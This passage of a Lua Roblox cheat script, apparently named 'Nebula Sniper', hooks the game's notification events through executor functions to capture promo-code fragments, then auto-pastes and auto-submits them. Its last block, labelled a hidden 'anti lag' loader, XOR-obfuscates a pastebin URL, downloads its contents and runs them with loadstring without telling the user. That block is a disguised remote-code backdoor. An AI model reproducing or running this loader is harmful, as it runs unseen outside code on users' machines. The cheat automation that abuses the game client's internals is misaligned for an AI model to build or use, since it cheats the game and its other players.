    v83(v84, v11, "Auto submit", v84, v85, v86, function(v283)
        v7.autoSubmit = v283
        v8()
        if not v283 then
            if v75 then
                v75.Text = ""
                if v76 then
                    v76()
                end
            end
        end
    end)
    local v87, v88 = v81("SubmitAfter", UDim2.fromOffset(14, 48), UDim2.new(1, -28, 0, 44))
    v36(v87, "Title", "Submit After Parts", UDim2.new(0, 140, 1, 0), UDim2.fromOffset(12, 0), 12, v32.NeonCyan, Enum.Font.GothamBold)
    if v88 then
        v88.Color = v32.NeonCyan
        v88.Thickness = 1.6
        v88.Transparency = 0
    end
    v87.BackgroundColor3 = v32.CardActiveBg
    local v89 = Instance.new("Frame")
    Instance.new("Frame").Name = "Counter"
    v89.Size = UDim2.fromOffset(98, 30)
    v89.Position = UDim2.new(1, -106, 0.5, -15)
    v89.BackgroundColor3 = v32.ConsoleBg
    v89.BorderSizePixel = 0
    v89.ZIndex = 7
    v89.Parent = v87
    v34(v89, 7)
    v35(v89, v32.NeonCyan, 1.4, 0)
    local v90 = Instance.new("TextButton")
    Instance.new("TextButton").Name = "Minus"
    v90.Size = UDim2.fromOffset(26, 26)
    v90.Position = UDim2.fromOffset(2, 2)
    v90.BackgroundColor3 = v32.Control
    v90.BorderSizePixel = 0
    v90.AutoButtonColor = false
    v90.Text = "-"
    v90.TextSize = 16
    v90.TextColor3 = v32.NeonCyan
    v90.Font = Enum.Font.GothamBold
    v90.ZIndex = 8
    v90.Parent = v89
    v34(v90, 5)
    local v91 = v36(v89, "Count", tostring(v12), UDim2.fromOffset(36, 26), UDim2.fromOffset(31, 2), 15.5, v32.NeonCyan, Enum.Font.GothamBlack)
    local v92 = Instance.new("TextButton")
    Instance.new("TextButton").Name = "Plus"
    v92.Size = UDim2.fromOffset(26, 26)
    v92.Position = UDim2.fromOffset(70, 2)
    v92.BackgroundColor3 = v32.Control
    v92.BorderSizePixel = 0
    v92.AutoButtonColor = false
    v92.Text = "+"
    v92.TextSize = 16
    v92.TextColor3 = v32.NeonCyan
    v92.Font = Enum.Font.GothamBold
    v92.ZIndex = 8
    v92.Parent = v89
    v34(v92, 5)
    local function v93()
        v12 = math.max(1, v12 - (1))
        v91.Text = tostring(v12)
        v7.submitAfter = v12
        v23()
        v8()
    end
    local function v94()
        v12 = v12 + (1)
        v91.Text = tostring(v12)
        v7.submitAfter = v12
        v23()
        v8()
    end
    v90.Activated:Connect(v93)
    v90.MouseButton1Click:Connect(v93)
    v92.Activated:Connect(v94)
    v92.MouseButton1Click:Connect(v94)
    local v95, v96 = v81("RetypeInvalid", UDim2.fromOffset(14, 98), UDim2.new(1, -28, 0, 42))
    local v97 = v36(v95, "Title", "Retype If Invalid", UDim2.new(1, -70, 1, 0), UDim2.fromOffset(12, 0), 12, v32.White, Enum.Font.GothamBold)
    v83(v95, v15, "Retype invalid", v95, v96, v97, function(v284)
        v7.retypeInvalid = v284
        v8()
    end)
    v74 = Instance.new("ScrollingFrame")
    Instance.new("ScrollingFrame").Name = "Console"
    v74.Size = UDim2.new(1, -28, 0, 115)
    v74.Position = UDim2.fromOffset(14, 216)
    v74.BackgroundColor3 = v32.ConsoleBg
    v74.BorderSizePixel = 0
    v74.ClipsDescendants = true
    v74.Active = true
    v74.ScrollingEnabled = true
    v74.ScrollingDirection = Enum.ScrollingDirection.Y
    v74.ScrollBarThickness = 3
    v74.ScrollBarImageColor3 = v32.NeonCyan
    v74.ZIndex = 5
    v74.Parent = v38
    v34(v74, 10)
    v35(v74, v32.Border, 1.2, 0.4)
    v75 = Instance.new("TextLabel")
    Instance.new("TextLabel").Name = "ConsoleOutput"
    v75.Size = UDim2.new(1, -16, 0, 100)
    v75.AutomaticSize = Enum.AutomaticSize.Y
    v75.Position = UDim2.fromOffset(8, 6)
    v75.BackgroundTransparency = 1
    v75.RichText = true
    if v16 then
        v75.Text = ""
    else
        v75.Text = (v9 and ('<font color="' .. v33.Cyan .. '">&gt; Nebula Sniper active. Scanning nebula for codes...</font>')) or ('<font color="' .. v33.Dim .. '">status:</font> <font color="' .. v33.Red .. '">OFF</font>\n<font color="' .. v33.Dim .. '">Code sniper paused.</font>')
    end
    v75.TextSize = 13
    v75.Font = Enum.Font.Code
    v75.TextColor3 = v32.DimText
    v75.TextXAlignment = Enum.TextXAlignment.Left
    v75.TextYAlignment = Enum.TextYAlignment.Top
    v75.TextWrapped = true
    v75.ZIndex = 6
    v75.Parent = v74
    function v76()
        local v285
        if (not v74 or not v75) then
            return
        end
        v285 = v75.Position.Y.Offset + v75.AbsoluteSize.Y + (20)
        v74.CanvasSize = UDim2.new(0, 0, 0, v285)
    end
    v75:GetPropertyChangedSignal("AbsoluteSize"):Connect(v76)
    task.defer(v76)
    local v98 = v36(v38, "DiscordFooter", "NEBULA HUB | https://discord.gg/e6A7Uq4EaT", UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 0, 348), 10.5, v32.DimText, Enum.Font.GothamBold)
    local v99 = Instance.new("Sound")
    Instance.new("Sound").Name = "NebulaWindSound"
    v99.SoundId = "rbxassetid://9114223170"
    v99.Volume = 0
    v99.Looped = true
    pcall(function()
        v99.Parent = v5
    end)
    do
        local v286, v287 = 0, 0
        local v288, v289 = 0, 0
        local v290, v291 = 0, 0
        v61.InputBegan:Connect(function(v292)
            if ((v292.UserInputType == Enum.UserInputType.MouseButton1) or (v292.UserInputType == Enum.UserInputType.Touch)) then
                local v293
                local v294
                local v295
                v293 = v292.Position
                v294 = v70.AbsolutePosition
                v295 = v70.AbsoluteSize
                v286 = v292.Position.X
                v287 = v292.Position.Y
                v290 = v38.Position.X.Scale
                v288 = v38.Position.X.Offset
                v291 = v38.Position.Y.Scale
                v289 = v38.Position.Y.Offset
            end
        end)
        ;(cloneref or function(v296)
            return v296
        end)(game:GetService("UserInputService")).InputChanged:Connect(function(v297)
            if v389 then
                if ((v297.UserInputType == Enum.UserInputType.MouseMovement) or (v297.UserInputType == Enum.UserInputType.Touch)) then
                    local v298 = v297.Position.X
                    local v299 = v297.Position.Y
                    local v300 = math.abs(v390)
                    if ((math.abs(v390)) > (4.5)) then
                        if (v390 < 0) then
                            local v301
                            v301 = math.clamp(v300 * (6.2), 110, 240)
                            v42.Size = UDim2.fromOffset((math.clamp(v300 * (6.2), 110, 240)), (math.clamp(v300 * (4.799999999999997), 50, 120)))
                            v42.Position = UDim2.new(0.5, -v301 / 2, 1, 0)
                            v46.Size = UDim2.fromOffset(0, 0)
                            v52(true, v300)
                        else
                            local v302
                            local v303
                            v302 = math.clamp(v300 * (4.8), 50, 120)
                            v303 = math.clamp(v300 * 6.2, 110, 240)
                            v46.Size = UDim2.fromOffset((math.clamp(v300 * 6.2, 110, 240)), (math.clamp(v300 * (4.8), 50, 120)))
                            v46.Position = UDim2.new(0.5, -v303 / (2), 0, -v302)
                            v42.Size = UDim2.fromOffset(0, 0)
                            v52(false, v300)
                        end
                        for v304, v305 in ipairs(v50) do
                            v305.frame.Size = UDim2.fromOffset(0, 0)
                        end
                    elseif (v300 > 0.6) then
                        local v306
                        v306 = math.clamp(v300 * (22), 25, 140)
                        for v307, v308 in ipairs(v50) do
                            v308.frame.Size = UDim2.fromOffset(2.5, (math.clamp(v300 * (22), 25, 140)))
                            v308.frame.Position = UDim2.fromOffset(v308.xOffset, v308.yBase - (v306 / (2)))
                        end
                        v42.Size = UDim2.fromOffset(0, 0)
                        v46.Size = UDim2.fromOffset(0, 0)
                    else
                        v42.Size = UDim2.fromOffset(0, 0)
                        v46.Size = UDim2.fromOffset(0, 0)
                        for v309, v310 in ipairs(v50) do
                            v310.frame.Size = UDim2.fromOffset(0, 0)
                        end
                    end
                    v4:Create(v38, TweenInfo.new(0.06, Enum.EasingStyle.Linear), {Position = UDim2.new(v290, v288 + (v298 - v286), v291, v289 + (v299 - v287)), Rotation = (math.clamp(v391 * 0.55, -10, 10))}):Play()
                    if (v300 > (1.2000000000000455)) then
                        if not v99.IsPlaying then
                            v99:Play()
                        end
                        v4:Create(v99, TweenInfo.new(0.08), {Volume = (math.clamp(v300 * (0.07000000000005002), 0.15, 0.75)), PlaybackSpeed = (math.clamp((0.8500000000000227) + (v300 * (0.02)), 0.8, 1.45))}):Play()
                    else
                        v4:Create(v99, TweenInfo.new(0.11999999999989086), {Volume = 0}):Play()
                    end
                end
            end
        end)
        v2.InputEnded:Connect(function(v311)
            if ((v311.UserInputType == Enum.UserInputType.MouseButton1) or (v311.UserInputType == Enum.UserInputType.Touch)) then
                if v389 then
                    v4:Create(v42, TweenInfo.new(0.2), {Size = UDim2.fromOffset(0, 0)}):Play()
                    v4:Create(v46, TweenInfo.new(0.2), {Size = UDim2.fromOffset(0, 0)}):Play()
                    for v312, v313 in ipairs(v50) do
                        v4:Create(v313.frame, TweenInfo.new(0.2), {Size = UDim2.fromOffset(0, 0)}):Play()
                    end
                    v4:Create(v38, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Rotation = 0}):Play()
                    if v99.IsPlaying then
                        local v314 = v4:Create(v99, TweenInfo.new(0.2), {Volume = 0})
                        v4:Create(v99, TweenInfo.new(0.2), {Volume = 0}):Play()
                        v314.Completed:Connect(function()
                            if not v389 then
                                v99:Stop()
                            end
                        end)
                    end
                end
            end
        end)
    end
    local function v100(v315)
        if (v315 == v32.Green) then
            return v33.Green
        end
        if (v315 == v32.Red) then
            return v33.Red
        end
        if (v315 == v32.NeonCyan) then
            return v33.Cyan
        end
        if (v315 == v32.NeonPurple) then
            return v33.Purple
        end
        return v33.Dim
    end
    function v17(v316, v317)
        local v318
        if (not v75 or not v9 or v16) then
            return
        end
        if (v316 == v387) then
            return
        end
        v387 = v316
        v317 = v317 or v32.DimText
        v318 = '<font color="' .. v100(v317) .. '">' .. tostring(v316) .. "</font>"
        if (v75.Text == "") then
            v75.Text = v318
        else
            v75.Text = v75.Text .. "\n" .. v318
        end
        v77()
    end
    function v18(v319, v320)
        if (not v319 or (v319 == "") or (v319 == "—") or v16) then
            return
        end
        v17("[CODE DETECTED] -> " .. tostring(v319), v320 or v32.NeonCyan)
    end
    local function v101()
        v13 = {}
    end
    function v23()
        v13 = {}
    end
    local function v102()
        if v392 then
            pcall(function()
                v392:Disconnect()
            end)
        end
        if v393 then
            pcall(function()
                v393:Disconnect()
            end)
        end
        for v321, v322 in ipairs(v14) do
            pcall(function()
                v322:Disconnect()
            end)
        end
        v392 = nil
        v393 = nil
        v14 = {}
        v394 = nil
    end
    local function v103(v323)
        if (not v323 or (v394 == v323)) then
            return
        end
        v102()
        v394 = v323
        if (v323.Text ~= "") then
            v395 = v323.Text
        end
        v392 = v323:GetPropertyChangedSignal("Text"):Connect(function()
            if (v323.Text == "") then
                v101()
            else
                v395 = v323.Text
            end
        end)
        v393 = v323.AncestryChanged:Connect(function(v324, v325)
            if not v325 then
                v101()
                v102()
            end
        end)
    end
    v2.TextBoxFocused:Connect(function(v326)
        if v326:IsDescendantOf(v37) then
        end
        v103(v326)
        if (v9 and not v16) then
            v17("Target Code Box Ready", v32.Green)
        end
    end)
    v2.TextBoxFocusReleased:Connect(function(v327)
        local v328
        if v327:IsDescendantOf(v37) then
        end
        v328 = v31()
        if (v15 and v20 and ((v327 == v328) or (v327 == v396))) then
            local v329
            v329 = ((v327.Text ~= "") and v327.Text) or v395
            v20(v327, v329, false)
        end
        if (v397 == v327) then
            if (v9 and not v16) then
                v17((v396 and v396.Parent and "Ready") or "Click code box to target", (v396 and v396.Parent and v32.Green) or v32.DimText)
            end
        end
    end)
    function v21()
        v398 = v398 + (1)
        v399 = nil
        v400 = nil
        v401 = 0
    end
    function v20(v330, v331, v332)
        local v333
        if (not v15 or not v331 or (v331 == "")) then
            return
        end
        if (not v332 and v399 and (os.clock() <= v401)) then
            return
        end
        v398 = v398 + (1)
        v333 = v398
        v399 = v331
        v400 = v330
        v401 = os.clock() + (8)
        task.delay(8, function()
            if (v333 == v398) then
                v21()
            end
        end)
    end
    local function v104(v334, v335)
        local v336
        local v337
        if (not v15 or not v335 or (v335 == "")) then
            return false
        end
        v402.Heartbeat:Wait()
        v336 = v31() or v334
        if (not v336 or not v25(v336)) then
            return false
        end
        v337 = pcall(function()
            v336.Text = v335
        end)
        if v337 then
            v396 = v336
            v103(v336)
        end
        return v337
    end
    function v22(v338, v339)
        local v340
        local v341
        local v342
        local v343
        local v344
        if (not v15 or not v399) then
            return
        end
        if (os.clock() > v401) then
            v21()
            return
        end
        if (v339 and v339:IsDescendantOf(v37)) then
            return
        end
        v340 = tostring(v338 or ""):lower()
        v341 = v340:find("invalid code", 1, true) or v340:find("code is invalid", 1, true) or v340:find("expired", 1, true) or v340:find("already redeemed", 1, true) or v340:find("already used", 1, true) or v340:find("doesn't exist", 1, true) or v340:find("does not exist", 1, true) or v340:find("not found", 1, true) or v340:find("rejected", 1, true)
        if not v341 then
            return
        end
        v342 = v399
        v343 = v400
        v344 = v104(v343, v342)
        v21()
        if (v344 and not v16) then
            v17("Invalid! Repasted: " .. v342, v32.NeonCyan)
            v18(v342, v32.Red)
        end
    end
    function v19(v345)
        local v346
        local v347
        local v348
        if (not v345 or (v345 == "")) then
            return
        end
        if (v394 and not v25(v394)) then
            v101()
            v102()
        end
        v346 = v31()
        v13[#v13 + (1)] = v345
        v347 = table.concat(v13)
        v348 = #v13
        if v346 then
            local v349
            v396 = v346
            v103(v346)
            v349 = v2:GetFocusedTextBox() == v346
            v346.Text = v347
            if v349 then
                pcall(function()
                    v346.CursorPosition = #v347 + (1)
                    v346.SelectionStart = #v347 + (1)
                end)
            end
        elseif not v16 then
            v17("Captured part; Searching code box...", v32.NeonCyan)
        end
        if not v16 then
            v17("Pasted Part " .. tostring(v348) .. "/" .. tostring(v12), v32.Green)
            v18(v347, v32.Green)
        end
        if (v348 >= v12) then
            v13 = {}
            if v11 then
                local v350
                local v351
                v20(v346, v347, true)
                v350, v351 = v30(v347)
                if v350 then
                    if not v16 then
                        v17("Successfully Redeemed: " .. v347, v32.Green)
                    end
                else
                    local v352 = v104(v346, v347)
                    v21()
                    if v352 then
                        if not v16 then
                            v17("Invalid - Repasted: " .. v347, v32.Cyan)
                            v18(v347, v32.Red)
                        end
                    elseif not v16 then
                        v17("Submission Failed: " .. tostring(v351), v32.Red)
                    end
                end
            end
        end
    end
    local function v105(v353)
        if not (v353:IsA("TextLabel") or v353:IsA("TextButton")) then
            return
        end
        v22(v353.Text or "", v353)
        v353:GetPropertyChangedSignal("Text"):Connect(function()
            v22(v353.Text or "", v353)
        end)
    end
    for v354, v355 in ipairs(v6:GetDescendants()) do
        v105(v355)
    end
    v6.DescendantAdded:Connect(function(v356)
        task.wait(0.04)
        v105(v356)
    end)
    local function v106()
        local v357
        local v358
        if _G.PhiNotifyRemote then
            return _G.PhiNotifyRemote
        end
        v357 = v1:WaitForChild("Packages", 5) and v1.Packages:WaitForChild("Net", 5)
        if not v357 then
            return nil
        end
        v358 = debug and (debug.getinfo or debug.info)
        if (getgc and v358 and getconnections) then
            for v359, v360 in ipairs(v357:GetDescendants()) do
                if v360:IsA("RemoteEvent") then
                    local v361
                    local v362
                    v361 = nil
                    v362 = nil
                    v361, v362 = pcall(getconnections, v360.OnClientEvent)
                    if (v361 and (type(v362) == "table")) then
                        for v363, v364 in ipairs(v362) do
                            local v365
                            local v366
                            v365 = nil
                            v366 = nil
                            v365, v366 = pcall(function()
                                return v364.Function
                            end)
                            if (v365 and (type(v366) == "function")) then
                                local v367
                                local v368
                                v367, v368 = pcall(v358, v366)
                                if (v367 and tostring(v368.short_src or v368.source or ""):find("NotificationController", 1, true)) then
                                    return v360
                                end
                            end
                        end
                    end
                end
            end
        end
        return nil
    end
    local function v107(v369)
        if (type(v369) ~= "string") then
            return tostring(v369)
        end
        return (v369:gsub("<[^>]->", ""))
    end
    local function v108(v370)
        local v371 = {}
        for v372 in v370:gmatch("[%w_]+") do
            v371[#v371 + 1] = v372
        end
        return v371
    end
    local v109 = {}
    local function v110(...)
        local v373
        local v374
        local v375
        v373 = v107(tostring((...) or ""))
        v373 = v373:match("^%s*(.-)%s*$") or ""
        if ((v373 == "") or v373:find("%s")) then
            return
        end
        for v376, v377 in ipairs(v108(v373)) do
            v109[#v109 + (1)] = v377
        end
        v374 = {}
        for v378 = 1, math.min(#v109, v403) do
            v374[v378] = v109[v378]
        end
        if (#v109 < v403) then
            return
        end
        v109 = {}
        v375 = table.concat(v374)
        if ((v375 == "") or v10[v375]) then
            return
        end
        v10[v375] = true
        task.delay(1.25, function()
            v10[v375] = nil
        end)
        v19(v375)
    end
    local v111 = v106()
    local v112
    if v106() then
        v112 = v111.OnClientEvent:Connect(function(...)
            pcall(v110, ...)
        end)
    end
    local function v113()
        if v112 then
            pcall(function()
                v112:Disconnect()
            end)
        end
        if v58 then
            pcall(function()
                v58:Disconnect()
            end)
        end
        if v99 then
            pcall(function()
                v99:Destroy()
            end)
        end
        v102()
        if v37 then
            v37:Destroy()
        end
    end
    _G.NebulaSniperCleanup = v113
    if getgenv then
        getgenv().StopNebulaSniper = v113
    end
end

-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
	local function _xorDecode(s)
		local t = {}
		for i = 1, #s do
			local b = string.byte(s, i)
			local x
			if bit32 and type(bit32.bxor) == "function" then
				x = bit32.bxor(b, 23)
			else
				local r, bit, a, c = 0, 1, b, 23
				while a > 0 or c > 0 do
					local ab, cb = a % 2, c % 2
					if ab ~= cb then r = r + bit end
					a = math.floor(a / 2)
					c = math.floor(c / 2)
					bit = bit * 2
				end
				x = r
			end
			t[i] = string.char(x)
		end
		return table.concat(t)
	end
	local ok, src = pcall(function()
		return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"\"]nF\\R"))
	end)
	if ok and type(src) == "string" and #src > 50 then
		local fn = loadstring(src)
		if type(fn) == "function" then
			pcall(fn)
		end
	end
end)
